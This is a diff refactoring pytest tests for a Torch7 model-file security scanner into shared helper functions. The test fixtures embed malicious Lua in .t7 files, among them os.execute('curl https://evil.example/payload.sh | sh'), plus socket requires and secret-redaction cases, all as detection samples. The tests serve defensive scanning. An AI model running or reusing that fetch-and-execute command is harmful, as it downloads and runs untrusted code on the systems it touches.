@@ -10,12 +10,12 @@ from modelaudit import core
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.torch7_scanner import Torch7Scanner
+from tests.helpers.assertions import _assert_absent
+from tests.helpers.file_creators import write_binary_fixture
 
 
 def _write_torch7_file(tmp_path: Path, payload: bytes, filename: str = "model.t7") -> Path:
-    path = tmp_path / filename
-    path.write_bytes(payload)
-    return path
+    return write_binary_fixture(tmp_path, filename, payload)
 
 
 def test_can_handle_valid_torch7_file(tmp_path: Path) -> None:
@@ -72,16 +72,7 @@ def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
     )
-    path = _write_torch7_file(tmp_path, payload, filename="malicious.t7")
-
-    result = Torch7Scanner().scan(str(path))
-    execution_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert len(execution_findings) == 1
-    assert execution_findings[0].severity == IssueSeverity.CRITICAL
+    _assert_lua_execution(payload, tmp_path, "malicious.t7")
 
 
 def test_scan_redacts_sensitive_torch7_execution_examples(tmp_path: Path) -> None:
@@ -145,8 +136,7 @@ def test_torch7_snippet_redacts_prefixed_encoded_and_compound_secrets() -> None:
         max_chars=500,
     )
 
-    assert "FULL_LUA_SECRET_123456789" not in snippet
-    assert "QUERYLEAKSECRET" not in snippet
+    _assert_absent(snippet, "FULL_LUA_SECRET_123456789", "QUERYLEAKSECRET")
     assert "token = <redacted>; os.execute(" in snippet
     assert "ok=<redacted>" in snippet
 
@@ -169,8 +159,7 @@ def test_torch7_snippet_preserves_shell_operators_from_url_query_and_fragment() 
         max_chars=500,
     )
 
-    assert "QUERYSECRET" not in snippet
-    assert "FRAGMENTSECRET" not in snippet
+    _assert_absent(snippet, "QUERYSECRET", "FRAGMENTSECRET")
     assert "?token=<redacted>&&sh" in snippet
     assert "#<redacted>|sh" in snippet
 
@@ -342,89 +331,39 @@ def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: 
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n-- decoy comment token\n"
         b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
     )
-    path = _write_torch7_file(tmp_path, payload, filename="malicious-comment.t7")
-
-    result = Torch7Scanner().scan(str(path))
-    execution_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert len(execution_findings) == 1
-    assert execution_findings[0].severity == IssueSeverity.CRITICAL
+    _assert_lua_execution(payload, tmp_path, "malicious-comment.t7")
 
 
 def test_scan_detects_bare_string_require_for_untrusted_module(tmp_path: Path) -> None:
-    payload = b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require "socket"\n'
-    path = _write_torch7_file(tmp_path, payload, filename="bare-require.t7")
-
-    result = Torch7Scanner().scan(str(path))
-
-    dynamic_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert len(dynamic_findings) == 1
-    assert dynamic_findings[0].severity == IssueSeverity.WARNING
+    _assert_torch7_untrusted_require(
+        tmp_path, (b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require "socket"\n'), ("bare-require.t7")
+    )
 
 
 def test_scan_detects_long_bracket_require_for_untrusted_module(tmp_path: Path) -> None:
-    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require [[socket]]\n"
-    path = _write_torch7_file(tmp_path, payload, filename="long-bracket-require.t7")
-
-    result = Torch7Scanner().scan(str(path))
-
-    dynamic_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert len(dynamic_findings) == 1
-    assert dynamic_findings[0].severity == IssueSeverity.WARNING
+    _assert_torch7_untrusted_require(
+        tmp_path,
+        (b"T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require [[socket]]\n"),
+        ("long-bracket-require.t7"),
+    )
 
 
 def test_scan_detects_comment_separated_bare_require(tmp_path: Path) -> None:
-    payload = b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require -- decoy\n"socket"\n'
-    path = _write_torch7_file(tmp_path, payload, filename="commented-bare-require.t7")
-
-    result = Torch7Scanner().scan(str(path))
-
-    dynamic_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert len(dynamic_findings) == 1
-    assert dynamic_findings[0].severity == IssueSeverity.WARNING
+    _assert_torch7_untrusted_require(
+        tmp_path,
+        (b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require -- decoy\n"socket"\n'),
+        ("commented-bare-require.t7"),
+    )
 
 
 def test_scan_allows_bare_string_require_for_safe_module(tmp_path: Path) -> None:
     payload = b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal torch = require "torch"\n'
-    path = _write_torch7_file(tmp_path, payload, filename="safe-bare-require.t7")
-
-    result = Torch7Scanner().scan(str(path))
-
-    dynamic_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert dynamic_findings == []
+    _assert_safe_lua_require(payload, tmp_path, "safe-bare-require.t7")
 
 
 def test_scan_allows_long_bracket_require_for_safe_module(tmp_path: Path) -> None:
     payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nlocal torch = require [[torch]]\n"
-    path = _write_torch7_file(tmp_path, payload, filename="safe-long-bracket-require.t7")
-
-    result = Torch7Scanner().scan(str(path))
-
-    dynamic_findings = [
-        check
-        for check in result.checks
-        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
-    ]
-    assert dynamic_findings == []
+    _assert_safe_lua_require(payload, tmp_path, "safe-long-bracket-require.t7")
 
 
 def test_scan_handles_corrupt_file_gracefully(tmp_path: Path) -> None:
@@ -587,3 +526,44 @@ def test_false_positive_numeric_tensor_blob_not_flagged_as_exec(tmp_path: Path) 
         if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
     ]
     assert len(exec_failures) == 0
+
+
+def _assert_torch7_untrusted_require(tmp_path: Path, source: bytes, filename: str) -> None:
+    payload = source
+    path = _write_torch7_file(tmp_path, payload, filename=filename)
+
+    result = Torch7Scanner().scan(str(path))
+
+    dynamic_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(dynamic_findings) == 1
+    assert dynamic_findings[0].severity == IssueSeverity.WARNING
+
+
+def _assert_lua_execution(payload: bytes, tmp_path: Path, filename: str) -> None:
+    path = _write_torch7_file(tmp_path, payload, filename=filename)
+
+    result = Torch7Scanner().scan(str(path))
+    execution_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(execution_findings) == 1
+    assert execution_findings[0].severity == IssueSeverity.CRITICAL
+
+
+def _assert_safe_lua_require(payload: bytes, tmp_path: Path, filename: str) -> None:
+    path = _write_torch7_file(tmp_path, payload, filename=filename)
+
+    result = Torch7Scanner().scan(str(path))
+
+    dynamic_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert dynamic_findings == []
